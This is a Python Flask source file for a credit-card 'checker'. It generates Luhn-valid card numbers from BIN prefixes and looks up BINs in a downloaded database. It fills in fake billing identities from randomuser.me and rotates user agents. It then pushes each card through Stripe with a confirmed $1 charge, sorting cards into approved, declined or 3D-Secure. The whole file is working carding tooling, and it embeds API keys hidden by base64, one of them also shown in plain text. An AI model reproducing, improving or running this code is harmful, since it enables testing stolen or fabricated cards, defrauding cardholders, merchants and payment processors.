from flask import Flask, render_template, request, jsonify
import random
import asyncio
import aiohttp
import re
import csv
import base64
import os
import requests
from datetime import datetime
from urllib.parse import urlencode
from fake_useragent import UserAgent
from pathlib import Path

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE_PATH = os.path.join(BASE_DIR, 'data', 'bin_database.csv')

def ensure_database():
    """Download the BIN database if it doesn't exist"""
    db_path = Path(DATABASE_PATH)
    db_dir = db_path.parent
    
    # Create data directory if it doesn't exist
    db_dir.mkdir(exist_ok=True)
    
    # Download if file doesn't exist
    if not db_path.exists():
        print("📥 Downloading BIN database (25MB)...")
        # Your Google Drive direct download link
        download_url = "https://drive.google.com/uc?export=download&id=1njUaQKCpyjA9mCZAmGDh39SChK3O-1EH"
        
        try:
            # Download with progress indication
            response = requests.get(download_url, stream=True)
            response.raise_for_status()
            
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            
            with open(db_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        progress = (downloaded / total_size) * 100
                        print(f"📊 Progress: {progress:.1f}%", end='\r')
            
            print("\n✅ Database downloaded successfully!")
            # Quick count of records
            with open(db_path, 'r', encoding='utf-8') as f:
                line_count = sum(1 for line in f) - 1
            print(f"📊 Total records: {line_count:,}")
            
        except Exception as e:
            print(f"❌ Failed to download database: {e}")
            # Create empty file as fallback
            db_path.touch()
            print("⚠️ Created empty database file as fallback")

# Call this before the app runs
ensure_database()

def _d(s):
    return base64.b64decode(s).decode('utf-8')

# Stripe Keys (base64 encoded for security)
# Your publishable key (already in your code)
STRIPE_PUBLISHABLE_KEY = _d('cGtfbGl2ZV81MTA0OUhtNFFGYUd5Y2dSS09JYnVwUnc3cmY2NUZKRVNtUHFXWms5SnRwZjJZQ3Z4bmpNQUZYN2RPUEFnb3h2OU0yd3doaTVPd0ZCeDFFenVvVHhOekxKRDAwVmlCYk12a1E=')

# Your secret key from the dashboard - base64 encoded
# Run this in Python to encode: 
# import base64; print(base64.b64encode(b"sk_test_51T6sZIJ8l6qQb98i3Ku0qpF8QRyEQau3I0VAyrZPgtyLKRLmD3bS9h8LL4lHvNHhuQQJUvQWGvO5Ag0P7vQ5D7YM00RXn7x6GA").decode())
STRIPE_SECRET_KEY = _d('c2tfdGVzdF81MVQ2c1pJSjhsNnFRYjk4aTNLdTBxcEY4UVJ5RVFhdTNJMFZBeXJaUGd0eUxLUkxtRDNiUzloOExMNGxIdk5IaHVRUUpVdlFXR3ZPNUFnMFA3dlE1RDdZTTAwUlhuN3g2R0E=')

SUCCESS_KEYWORDS = [
    "succeeded", "payment-success", "successfully", "thank you for your support",
    "thank you", "membership confirmation", "thank you for your payment",
    "thank you for membership", "payment received", "your order has been received",
    "purchase successful"
]

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    card_str = str(card_number)
    digits = digits_of(card_str)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    
    checksum = sum(odd_digits)
    for d in even_digits:
        doubled = d * 2
        checksum += doubled if doubled < 10 else doubled - 9
    
    return checksum % 10

def calculate_luhn(partial):
    partial_str = str(partial)
    for check_digit in range(10):
        if luhn_checksum(partial_str + str(check_digit)) == 0:
            return check_digit
    return 0

def generate_card(bin_prefix, month=None, year=None, cvv=None):
    if not bin_prefix:
        bin_prefix = "4242"
    
    bin_prefix = str(bin_prefix).lower()
    bin_prefix = ''.join([str(random.randint(0, 9)) if c == 'x' else c for c in bin_prefix])
    
    bin_prefix = bin_prefix.ljust(6, '4')
    if len(bin_prefix) > 15:
        bin_prefix = bin_prefix[:15]
    
    max_attempts = 100
    card_number = None
    
    for attempt in range(max_attempts):
        remaining_length = 15 - len(bin_prefix)
        if remaining_length < 0:
            remaining_length = 0
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        partial_card = bin_prefix + random_digits
        
        check_digit = calculate_luhn(partial_card)
        card_number = partial_card + str(check_digit)
        
        if luhn_checksum(card_number) == 0:
            break
        
        if attempt == max_attempts - 1:
            raise ValueError("Failed to generate valid Luhn card number")
    
    if not month:
        month = str(random.randint(1, 12)).zfill(2)
    else:
        month = str(month).zfill(2)
    
    current_year = datetime.now().year
    if not year:
        year = str(random.randint(current_year, current_year + 5))
    else:
        year = str(year)
        if len(str(year)) == 2:
            year = '20' + str(year)
    
    if int(year) < current_year:
        year = str(current_year)
    
    if not cvv:
        cvv = str(random.randint(100, 999))
    else:
        cvv = str(cvv).zfill(3)
    
    return f"{card_number}|{month}|{year}|{cvv}"

def generate_bin(card_type):
    card_type_bins = {
        'visa': ['4'],
        'mastercard': ['51', '52', '53', '54', '55', '2221', '2222', '2223', '2224', '2225', '2226', '2227', '2228', '2229', '223', '224', '225', '226', '227', '228', '229', '23', '24', '25', '26', '270', '271', '2720'],
        'amex': ['34', '37'],
        'discover': ['6011', '622126', '622127', '622128', '622129', '62213', '62214', '62215', '62216', '62217', '62218', '62219', '6222', '6223', '6224', '6225', '6226', '6227', '6228', '6229', '644', '645', '646', '647', '648', '649', '65']
    }
    
    bin_prefixes = card_type_bins.get(card_type, ['4'])
    selected_prefix = random.choice(bin_prefixes)
    
    bin_length = 6
    remaining_length = bin_length - len(selected_prefix)
    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
    
    return selected_prefix + random_digits

def get_total_bins():
    try:
        with open(DATABASE_PATH, 'r', encoding='utf-8') as file:
            return sum(1 for line in file) - 1
    except:
        return 0

def lookup_bin(bin_number):
    try:
        with open(DATABASE_PATH, 'r', encoding='utf-8') as file:
            csv_reader = csv.DictReader(file)
            for row in csv_reader:
                if row['BIN'] == str(bin_number):
                    return {
                        'bin': row['BIN'],
                        'brand': row['Brand'],
                        'type': row['Type'],
                        'category': row['Category'],
                        'issuer': row['Issuer'],
                        'country': row['CountryName']
                    }
        return None
    except Exception as e:
        return None

def get_random_bin_from_database(card_type):
    try:
        with open(DATABASE_PATH, 'r', encoding='utf-8') as file:
            csv_reader = csv.DictReader(file)
            matching_bins = []
            
            for row in csv_reader:
                brand = row['Brand'].lower()
                bin_num = row.get('BIN', '').strip()
                type_val = row.get('Type', '').strip()
                category = row.get('Category', '').strip()
                issuer = row.get('Issuer', '').strip()
                country = row.get('CountryName', '').strip()
                
                if not all([bin_num, brand, type_val, category, issuer, country]):
                    continue
                
                if 'n/a' in brand.lower() or 'n/a' in type_val.lower() or 'n/a' in category.lower() or 'n/a' in issuer.lower() or 'n/a' in country.lower():
                    continue
                
                if card_type == 'visa' and 'visa' in brand:
                    matching_bins.append(row)
                elif card_type == 'mastercard' and 'mastercard' in brand:
                    matching_bins.append(row)
                elif card_type == 'amex' and ('american express' in brand or 'amex' in brand):
                    matching_bins.append(row)
                elif card_type == 'discover' and 'discover' in brand:
                    matching_bins.append(row)
            
            if matching_bins:
                selected = random.choice(matching_bins)
                return {
                    'bin': selected['BIN'],
                    'brand': selected['Brand'],
                    'type': selected['Type'],
                    'category': selected['Category'],
                    'issuer': selected['Issuer'],
                    'country': selected['CountryName']
                }
        return None
    except Exception as e:
        return None

async def http_request(data, options):
    headers = options.get('CustomHeaders', {})
    cookies = options.get('CustomCookies', {})
    timeout = options.get('TimeoutMilliseconds', 15000) / 1000
    
    async with aiohttp.ClientSession() as session:
        try:
            if options['Method'] == 'GET':
                async with session.get(
                    options['Url'],
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=options.get('AutoRedirect', True),
                    max_redirects=options.get('MaxNumberOfRedirects', 8)
                ) as response:
                    if options.get('ReadResponseContent', True):
                        data['SOURCE'] = await response.text()
                    return response
            elif options['Method'] == 'POST':
                async with session.post(
                    options['Url'],
                    headers=headers,
                    cookies=cookies,
                    data=options.get('Content', ''),
                    timeout=timeout,
                    allow_redirects=options.get('AutoRedirect', True),
                    max_redirects=options.get('MaxNumberOfRedirects', 8)
                ) as response:
                    if options.get('ReadResponseContent', True):
                        data['SOURCE'] = await response.text()
                    return response
        except Exception as e:
            data['STATUS'] = 'ERROR'
            data['ERROR'] = str(e)
            return None

def parse_between_strings(data, source, start, end, case_sensitive=True, default="", regex_escape=False, use_regex=False):
    try:
        if not case_sensitive:
            source = source.lower()
            start = start.lower()
            end = end.lower()
        
        if use_regex:
            pattern = f"{re.escape(start) if regex_escape else start}(.*?){re.escape(end) if regex_escape else end}"
            match = re.search(pattern, source, re.DOTALL)
            return match.group(1) if match else default
        else:
            start_idx = source.find(start) + len(start)
            end_idx = source.find(end, start_idx)
            if start_idx == -1 or end_idx == -1:
                return default
            return source[start_idx:end_idx]
    except Exception as e:
        return default

def random_user_agent(data, platform='all'):
    ua = UserAgent()
    return ua.random

def to_lowercase(data, string):
    return string.lower()

def check_condition(source, comparison, value):
    if comparison == 'Contains':
        return value in source.lower()
    return False

def parse_card_input(card_input):
    try:
        card_number, month, year, cvv = card_input.strip().split('|')
        return {
            'cc': card_number,
            'month': month,
            'year': year,
            'cvv': cvv
        }
    except ValueError:
        return None

async def process_card(data, card):
    data['input'] = card
    data['ExecutingBlock'] = "Http Request - Random User"
    
    # Get random user data
    await http_request(data, {
        'Content': '',
        'ContentType': 'application/x-www-form-urlencoded',
        'UrlEncodeContent': False,
        'Url': 'https://randomuser.me/api/',
        'Method': 'GET',
        'AutoRedirect': True,
        'MaxNumberOfRedirects': 8,
        'ReadResponseContent': True,
        'AbsoluteUriInFirstLine': False,
        'HttpLibrary': 'aiohttp',
        'SecurityProtocol': 'SystemDefault',
        'CustomCookies': {},
        'CustomHeaders': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8'
        },
        'TimeoutMilliseconds': 15000,
        'HttpVersion': '1.1',
        'CodePagesEncoding': '',
        'AlwaysSendContent': False,
        'DecodeHtml': False,
        'UseCustomCipherSuites': False,
        'CustomCipherSuites': []
    })
    
    data['ExecutingBlock'] = "Random User Agent"
    user_agent = random_user_agent(data, 'all')
    data['user_agent'] = user_agent
    
    data['ExecutingBlock'] = "Parse User Data"
    data['first'] = parse_between_strings(data, data.get('SOURCE', ''), '{"title":"Mr","first":"', '",', True, "", "", False)
    data['last'] = parse_between_strings(data, data.get('SOURCE', ''), '"last":"', '"},', True, "", "", False)
    data['street'] = parse_between_strings(data, data.get('SOURCE', ''), ',"name":"', '"},', True, "", "", False)
    data['city'] = parse_between_strings(data, data.get('SOURCE', ''), ',"city":"', '",', True, "", "", False)
    data['state'] = parse_between_strings(data, data.get('SOURCE', ''), ',"state":"', '",', True, "", "", False)
    data['zip'] = parse_between_strings(data, data.get('SOURCE', ''), '"postcode":', ',"', True, "", "", False)
    data['phone'] = parse_between_strings(data, data.get('SOURCE', ''), '"phone":"', '",', True, "", "", False)
    data['email'] = parse_between_strings(data, data.get('SOURCE', ''), ',"email":"', '",', True, "", "", False)
    data['country'] = parse_between_strings(data, data.get('SOURCE', ''), ',"nat":"', '"}]', True, "", "", False)
    
    data['ExecutingBlock'] = "Create Payment Method"
    
    # Create payment method with Stripe
    content = urlencode({
        'type': 'card',
        'billing_details[address][postal_code]': data.get('zip', ''),
        'billing_details[address][city]': data.get('city', ''),
        'billing_details[address][country]': data.get('country', ''),
        'billing_details[address][line1]': data.get('street', ''),
        'billing_details[email]': data.get('email', ''),
        'billing_details[name]': f"{data.get('first', '')} {data.get('last', '')}",
        'card[number]': data['input']['cc'],
        'card[cvc]': data['input']['cvv'],
        'card[exp_month]': data['input']['month'],
        'card[exp_year]': data['input']['year'],
        'key': STRIPE_PUBLISHABLE_KEY
    })
    
    response = await http_request(data, {
        'Content': content,
        'ContentType': 'application/x-www-form-urlencoded',
        'UrlEncodeContent': False,
        'Url': 'https://api.stripe.com/v1/payment_methods',
        'Method': 'POST',
        'AutoRedirect': True,
        'MaxNumberOfRedirects': 8,
        'ReadResponseContent': True,
        'AbsoluteUriInFirstLine': False,
        'HttpLibrary': 'aiohttp',
        'SecurityProtocol': 'SystemDefault',
        'CustomCookies': {},
        'CustomHeaders': {
            'User-Agent': data['user_agent'],
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        'TimeoutMilliseconds': 15000,
        'HttpVersion': '1.1',
        'CodePagesEncoding': '',
        'AlwaysSendContent': False,
        'DecodeHtml': False,
        'UseCustomCipherSuites': False,
        'CustomCipherSuites': []
    })
    
    # Parse payment method ID
    data['ExecutingBlock'] = "Parse Payment Method"
    source = data.get('SOURCE', '')
    
    # Check if payment method creation failed
    if '"error"' in source.lower():
        error_message = parse_between_strings(data, source, '"message":"', '"', True, "Payment method creation failed", "", False)
        data['STATUS'] = 'FAIL'
        return {
            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
            'status': 'FAIL', 
            'message': error_message,
            'response': source[:500]
        }
    
    stripe_id = parse_between_strings(data, source, '"id": "', '",', True, "", "", False)
    data['stripe_id'] = stripe_id
    
    if not stripe_id or stripe_id == 'Url':
        data['STATUS'] = 'FAIL'
        return {
            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
            'status': 'FAIL', 
            'message': 'Failed to create payment method',
            'response': source[:500]
        }
    
    data['ExecutingBlock'] = "Create Payment Intent"
    
    # Create and confirm payment intent with Stripe (charge $1)
    content = urlencode({
        'amount': '100',  # $1.00 in cents
        'currency': 'usd',
        'payment_method': stripe_id,
        'confirm': 'true',
        'confirmation_method': 'manual',
        'return_url': 'https://www.charitywater.org/thank-you'
    })
    
    await http_request(data, {
        'Content': content,
        'ContentType': 'application/x-www-form-urlencoded',
        'UrlEncodeContent': False,
        'Url': 'https://api.stripe.com/v1/payment_intents',
        'Method': 'POST',
        'AutoRedirect': True,
        'MaxNumberOfRedirects': 8,
        'ReadResponseContent': True,
        'AbsoluteUriInFirstLine': False,
        'HttpLibrary': 'aiohttp',
        'SecurityProtocol': 'SystemDefault',
        'CustomCookies': {},
        'CustomHeaders': {
            'Authorization': f'Bearer {STRIPE_SECRET_KEY}',
            'User-Agent': data['user_agent'],
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        'TimeoutMilliseconds': 15000,
        'HttpVersion': '1.1',
        'CodePagesEncoding': '',
        'AlwaysSendContent': False,
        'DecodeHtml': False,
        'UseCustomCipherSuites': False,
        'CustomCipherSuites': []
    })
    
    data['ExecutingBlock'] = "Parse Response"
    source = data.get('SOURCE', '')
    source_lower = source.lower()
    
    # Debug: Print response for troubleshooting
    print(f"Stripe Response: {source[:500]}")
    
    # Check for success
    if '"status": "succeeded"' in source_lower or '"status":"succeeded"' in source_lower:
        data['STATUS'] = 'SUCCESS'
        return {
            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
            'status': 'SUCCESS', 
            'message': 'Approved ✓ - $1 charged successfully',
            'response': source[:500]
        }
    
    # Check for requires action (3D Secure)
    if '"status": "requires_action"' in source_lower or '"next_action"' in source_lower:
        data['STATUS'] = 'UNKNOWN'
        return {
            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
            'status': 'UNKNOWN', 
            'message': '3D Secure required - cannot automate',
            'response': source[:500]
        }
    
    # Parse error message
    message = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
    if not message:
        message = parse_between_strings(data, source, '"error":{"message":"', '"', True, "", "", False)
    if not message:
        message = parse_between_strings(data, source, '"decline_code":"', '"', True, "", "", False)
    
    # Check for decline/failure keywords
    decline_keywords = [
        'insufficient_funds', 'insufficient funds',
        'card_declined', 'card was declined',
        'incorrect_number', 'invalid_number',
        'expired_card', 'incorrect_cvc',
        'processing_error', 'incorrect_zip',
        'pickup_card', 'lost_card', 'stolen_card'
    ]
    
    for keyword in decline_keywords:
        if keyword in source_lower:
            data['STATUS'] = 'FAIL'
            return {
                'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
                'status': 'FAIL', 
                'message': message or f'Card Declined: {keyword}',
                'response': source[:500]
            }
    
    # Unknown response
    data['STATUS'] = 'UNKNOWN'
    return {
        'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
        'status': 'UNKNOWN', 
        'message': message or f'Unknown Response',
        'response': source[:500]
    }

@app.route('/')
def index():
    response = render_template('index.html')
    return response

@app.route('/generate', methods=['POST'])
def generate():
    data = request.json
    bin_input = data.get('bin', '')
    month = data.get('month', None)
    year = data.get('year', None)
    cvv = data.get('cvv', None)
    
    if '|' in bin_input:
        parts = bin_input.split('|')
        bin_prefix = parts[0]
        if len(parts) > 1 and parts[1].strip():
            month = parts[1].strip()
        if len(parts) > 2 and parts[2].strip():
            year = parts[2].strip()
        if len(parts) > 3 and parts[3].strip():
            cvv = parts[3].strip()
    else:
        bin_prefix = bin_input
    
    if month == '':
        month = None
    if year == '':
        year = None
    if cvv == '':
        cvv = None
    
    if year and len(str(year)) == 2:
        year = '20' + str(year)
    
    card = generate_card(bin_prefix, month, year, cvv)
    return jsonify({'card': card})

@app.route('/generate_bin', methods=['POST'])
def generate_bin_route():
    data = request.json
    card_type = data.get('card_type', 'visa')
    generation_mode = data.get('mode', 'random')
    
    if generation_mode == 'database':
        bin_data = get_random_bin_from_database(card_type)
        if bin_data:
            return jsonify(bin_data)
        else:
            return jsonify({'error': 'No matching BINs found in database'}), 404
    else:
        bin_number = generate_bin(card_type)
        return jsonify({'bin': bin_number})

@app.route('/check_bin', methods=['POST'])
def check_bin_route():
    data = request.json
    bin_number = data.get('bin', '')
    
    result = lookup_bin(bin_number)
    total_bins = get_total_bins()
    
    if result:
        result['total_database'] = total_bins
        return jsonify(result)
    else:
        return jsonify({'error': 'BIN not found', 'total_database': total_bins}), 404

@app.route('/check', methods=['POST'])
def check_card():
    data = request.json
    card_data = data.get('card', '')
    
    card = parse_card_input(card_data)
    if not card:
        return jsonify({'status': 'error', 'message': 'Invalid card format', 'card': card_data})
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(process_card({}, card))
    loop.close()
    
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
